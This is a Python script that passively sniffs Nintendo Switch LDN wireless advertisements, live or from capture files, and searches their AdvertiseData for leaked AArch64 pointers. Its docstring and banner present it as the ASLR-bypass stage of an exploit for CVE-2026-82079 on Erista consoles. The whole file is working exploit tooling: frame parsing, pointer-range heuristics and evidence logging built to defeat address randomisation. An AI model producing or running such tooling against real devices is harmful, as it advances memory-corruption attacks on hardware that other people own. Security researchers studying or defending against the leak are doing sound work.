#!/usr/bin/env python3
"""
LDN AdvertiseData Infoleak Scanner

Scans for LDN network advertisements and examines the AdvertiseData
for leaked pointers. Switchbrew documents that uninitialized bytes
after the username in AdvertiseData can leak stack/code pointers,
defeating ASLR.

This is the ASLR bypass step for CVE-2026-82079 exploitation on Erista.

The scanner:
1. Puts WiFi interface in monitor mode
2. Listens for LDN advertisement action frames (vendor OUI 00:22:AA)
3. Parses AdvertiseData from the advertisement payload
4. Checks for pointer-like values in uninitialized regions
5. Reports any leaked addresses that look like code/stack pointers

AArch64 pointer characteristics on Switch:
- Code region: 0x7100000000 - 0x71FFFFFFFF (typical sysmodule)
- Stack region: variable, but typically high addresses
- Heap region: variable
- Any 8-byte value matching these patterns is a candidate leak

Usage:
    # Monitor mode scan (requires root + monitor-capable WiFi card)
    sudo python3 -I ldn_infoleak_scanner.py --iface wlp5s0 --duration 30

    # Analyze a pcap file (offline)
    python3 -I ldn_infoleak_scanner.py --pcap ../evidence/ldn_monitor.pcap

    # Also check raw AdvertiseData from the Switch AP's vendor IEs
    sudo python3 -I ldn_infoleak_scanner.py --iface wlp5s0 --beacon-scan

Evidence saved to ../evidence/ldn_infoleak/
"""

import struct
import argparse
import json
import sys
import time
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "ldn_infoleak"

NINTENDO_OUI = b"\x00\x22\xaa"
LDN_ADVERT_DATA_OFFSET = 0x24
LDN_USERNAME_OFFSET = 0x24
LDN_USERNAME_MAX = 0x20

# AArch64 pointer heuristics for Switch sysmodules
POINTER_RANGES = [
    ("code_region", 0x7100000000, 0x71FFFFFFFF),
    ("stack_high", 0x7F00000000, 0x7FFFFFFFFFFF),
    ("heap_typical", 0x7200000000, 0x72FFFFFFFF),
    ("alias_region", 0x7000000000, 0x70FFFFFFFF),
]


def evidence_dir():
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    return EVIDENCE_DIR


def is_pointer_candidate(value: int) -> str | None:
    """Check if an 8-byte value looks like an AArch64 pointer."""
    if value == 0 or value == 0xFFFFFFFFFFFFFFFF:
        return None
    for name, lo, hi in POINTER_RANGES:
        if lo <= value <= hi:
            return name
    # Also check for 2MB-aligned values (ASLR base candidates)
    if 0x7000000000 <= value <= 0x7FFFFFFFFFFF:
        if value & 0x1FFFFF == 0:
            return "aslr_base_candidate"
        return "generic_high_addr"
    return None


def analyze_advertise_data(data: bytes, source: str = "unknown") -> dict:
    """Analyze AdvertiseData for pointer leaks.

    The AdvertiseData is embedded in LDN advertisement frames.
    Username is at a known offset, and bytes after it may be uninitialized.
    """
    result = {
        "source": source,
        "data_size": len(data),
        "data_hex": data.hex(),
        "leaks": [],
    }

    # Find the end of the username (null-terminated, max 0x20 bytes)
    username_end = None
    for i in range(min(LDN_USERNAME_MAX, len(data))):
        if data[i] == 0:
            username_end = i
            break
    if username_end is None:
        username_end = min(LDN_USERNAME_MAX, len(data))

    result["username"] = data[:username_end].decode("utf-8", errors="replace")
    result["username_len"] = username_end

    # Check bytes after username for pointer-like values
    scan_start = username_end
    for offset in range(scan_start, len(data) - 7, 1):
        value = struct.unpack_from("<Q", data, offset)[0]
        region = is_pointer_candidate(value)
        if region:
            result["leaks"].append({
                "offset": offset,
                "value": f"0x{value:016x}",
                "region": region,
                "aligned_2mb": (value & 0x1FFFFF) == 0,
            })

    # Also scan entire buffer for any 8-byte aligned pointer candidates
    for offset in range(0, len(data) - 7, 8):
        value = struct.unpack_from("<Q", data, offset)[0]
        region = is_pointer_candidate(value)
        if region:
            already = any(l["offset"] == offset for l in result["leaks"])
            if not already:
                result["leaks"].append({
                    "offset": offset,
                    "value": f"0x{value:016x}",
                    "region": region,
                    "aligned_2mb": (value & 0x1FFFFF) == 0,
                    "note": "aligned_scan",
                })

    # Sort by offset
    result["leaks"].sort(key=lambda x: x["offset"])

    return result


def parse_ldn_advertisement(frame_bytes: bytes) -> dict | None:
    """Parse an LDN advertisement action frame and extract AdvertiseData."""
    # Look for Nintendo OUI in the frame
    oui_pos = frame_bytes.find(NINTENDO_OUI)
    if oui_pos < 0:
        return None

    # The advertisement payload follows the OUI + type byte
    advert_start = oui_pos + len(NINTENDO_OUI) + 1  # +1 for type byte

    if advert_start + 0x48 > len(frame_bytes):
        return None

    # LDN advertisement structure (from kinnay wiki):
    # +0x00: header (varies by version)
    # +0x22: size field (u16 BE) = payload size
    # +0x24: session info (varies)
    # AdvertiseData is embedded within the payload

    result = {
        "oui_offset": oui_pos,
        "payload_start": advert_start,
        "payload_size": len(frame_bytes) - advert_start,
    }

    # Try to extract version and size
    if advert_start + 0x24 <= len(frame_bytes):
        version = frame_bytes[advert_start]
        size = struct.unpack_from(">H", frame_bytes, advert_start + 0x22)[0]
        result["version"] = version
        result["declared_size"] = size

    # The AdvertiseData region within the payload
    # Its exact offset depends on version and struct layout
    # For scanning, we'll analyze the entire payload for pointers
    payload = frame_bytes[advert_start:]
    result["payload_hex"] = payload.hex()

    return result


def scan_pcap(pcap_path: str) -> list[dict]:
    """Scan a pcap file for LDN advertisements and check for infoleaks."""
    try:
        from scapy.all import rdpcap, Dot11, Raw as ScapyRaw
    except ImportError:
        print("scapy required: pip install scapy")
        sys.exit(1)

    print(f"Reading {pcap_path}...")
    packets = rdpcap(pcap_path)
    print(f"  {len(packets)} packets")

    findings = []
    for i, pkt in enumerate(packets):
        raw = bytes(pkt)

        # Check for Nintendo OUI
        if NINTENDO_OUI not in raw:
            continue

        # Try to parse as LDN advertisement
        parsed = parse_ldn_advertisement(raw)
        if not parsed:
            continue

        # Analyze the entire payload for pointer leaks
        payload = bytes.fromhex(parsed["payload_hex"])
        analysis = analyze_advertise_data(payload, source=f"pcap_frame_{i}")
        analysis["frame_index"] = i
        analysis.update(parsed)

        if analysis["leaks"]:
            findings.append(analysis)
            print(f"  Frame {i}: {len(analysis['leaks'])} pointer candidates!")
            for leak in analysis["leaks"]:
                print(f"    offset {leak['offset']:3d}: {leak['value']} ({leak['region']})")

    if not findings:
        print("  No pointer leaks found in LDN advertisements.")

    return findings


def scan_vendor_ies(iface: str, duration: int = 30) -> list[dict]:
    """Scan beacon/probe response vendor IEs for Nintendo data.

    Nintendo vendor IEs (OUI 00:22:aa) in beacons may contain
    AdvertiseData that leaks pointers.
    """
    try:
        from scapy.all import sniff, Dot11Beacon, Dot11ProbeResp, Dot11Elt
    except ImportError:
        print("scapy required: pip install scapy")
        sys.exit(1)

    print(f"Scanning beacons/probes on {iface} for {duration}s...")
    findings = []
    seen_bssids = set()

    def process_pkt(pkt):
        raw = bytes(pkt)
        if NINTENDO_OUI not in raw:
            return

        # Find all vendor IEs with Nintendo OUI
        oui_pos = 0
        while True:
            oui_pos = raw.find(NINTENDO_OUI, oui_pos)
            if oui_pos < 0:
                break

            # Vendor IE: type=221, length, OUI(3), type(1), data
            if oui_pos >= 2:
                ie_start = oui_pos - 2
                ie_type = raw[ie_start]
                ie_len = raw[ie_start + 1]

                if ie_type == 221 and ie_len > 4:
                    vendor_type = raw[oui_pos + 3]
                    vendor_data = raw[oui_pos + 4:ie_start + 2 + ie_len]

                    bssid = None
                    if pkt.haslayer("Dot11"):
                        bssid = pkt["Dot11"].addr2

                    key = f"{bssid}:{vendor_type}:{len(vendor_data)}"
                    if key in seen_bssids:
                        oui_pos += 3
                        continue
                    seen_bssids.add(key)

                    analysis = analyze_advertise_data(
                        vendor_data,
                        source=f"beacon_ie_{bssid}_type{vendor_type}"
                    )
                    analysis["bssid"] = bssid
                    analysis["vendor_type"] = vendor_type

                    if analysis["leaks"]:
                        findings.append(analysis)
                        print(f"  BSSID {bssid} type {vendor_type}: "
                              f"{len(analysis['leaks'])} pointer candidates!")
                        for leak in analysis["leaks"]:
                            print(f"    offset {leak['offset']:3d}: "
                                  f"{leak['value']} ({leak['region']})")
                    else:
                        print(f"  BSSID {bssid} type {vendor_type}: "
                              f"{len(vendor_data)}B data, no leaks")

            oui_pos += 3

    try:
        sniff(iface=iface, prn=process_pkt, timeout=duration, store=False)
    except PermissionError:
        print("Need root for monitor mode sniffing")
        sys.exit(1)

    return findings


def scan_monitor(iface: str, duration: int = 30) -> list[dict]:
    """Full monitor mode scan for LDN action frames."""
    try:
        from scapy.all import sniff
    except ImportError:
        print("scapy required: pip install scapy")
        sys.exit(1)

    print(f"Monitor scan on {iface} for {duration}s...")
    print("Looking for LDN action frames with Nintendo OUI...")
    findings = []

    def process_pkt(pkt):
        raw = bytes(pkt)
        if NINTENDO_OUI not in raw:
            return

        parsed = parse_ldn_advertisement(raw)
        if not parsed:
            return

        payload = bytes.fromhex(parsed["payload_hex"])
        analysis = analyze_advertise_data(payload, source=f"monitor_{len(findings)}")
        analysis.update(parsed)

        if analysis["leaks"]:
            findings.append(analysis)
            print(f"\n  LDN frame with {len(analysis['leaks'])} pointer candidates!")
            for leak in analysis["leaks"]:
                print(f"    offset {leak['offset']:3d}: {leak['value']} ({leak['region']})")
        else:
            print(".", end="", flush=True)

    try:
        sniff(iface=iface, prn=process_pkt, timeout=duration, store=False)
    except PermissionError:
        print("Need root for monitor mode sniffing")
        sys.exit(1)

    print()
    return findings


def main():
    parser = argparse.ArgumentParser(
        description="LDN AdvertiseData Infoleak Scanner (ASLR bypass for CVE-2026-82079)")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--pcap", help="Analyze a pcap file for infoleaks")
    group.add_argument("--beacon-scan", action="store_true",
                       help="Scan beacon vendor IEs for infoleaks")
    group.add_argument("--monitor", action="store_true",
                       help="Full monitor mode scan for LDN action frames")
    group.add_argument("--analyze-hex", help="Analyze raw hex AdvertiseData")

    parser.add_argument("--iface", help="WiFi interface (for live scanning)")
    parser.add_argument("--duration", type=int, default=30,
                        help="Scan duration in seconds (default 30)")
    args = parser.parse_args()

    print("╔══════════════════════════════════════════════════════════╗")
    print("║  LDN AdvertiseData Infoleak Scanner                     ║")
    print("║  ASLR bypass for CVE-2026-82079 on Erista               ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"Time: {datetime.now(timezone.utc).isoformat()}")
    print("-" * 60)

    findings = []

    if args.pcap:
        findings = scan_pcap(args.pcap)

    elif args.beacon_scan:
        if not args.iface:
            parser.error("--beacon-scan requires --iface")
        findings = scan_vendor_ies(args.iface, args.duration)

    elif args.monitor:
        if not args.iface:
            parser.error("--monitor requires --iface")
        findings = scan_monitor(args.iface, args.duration)

    elif args.analyze_hex:
        data = bytes.fromhex(args.analyze_hex)
        analysis = analyze_advertise_data(data, source="cmdline")
        if analysis["leaks"]:
            findings = [analysis]
            print(f"Found {len(analysis['leaks'])} pointer candidates:")
            for leak in analysis["leaks"]:
                print(f"  offset {leak['offset']:3d}: {leak['value']} ({leak['region']})")
        else:
            print("No pointer candidates found.")

    # Save results
    if findings:
        summary = {
            "test": "ldn_infoleak_scan",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "total_findings": len(findings),
            "findings": findings,
        }
        path = evidence_dir() / "infoleak_scan.json"
        with open(path, "w") as f:
            json.dump(summary, f, indent=2, default=str)
        print(f"\n{'=' * 60}")
        print(f"Found {len(findings)} frames with pointer candidates!")
        print(f"Saved: {path}")
    else:
        print(f"\nNo pointer leaks found.")
        print("The infoleak may require the Switch to be hosting an LDN session")
        print("(not just the lp2p AP — need an active game session with AdvertiseData).")

    print("=" * 60)


if __name__ == "__main__":
    main()
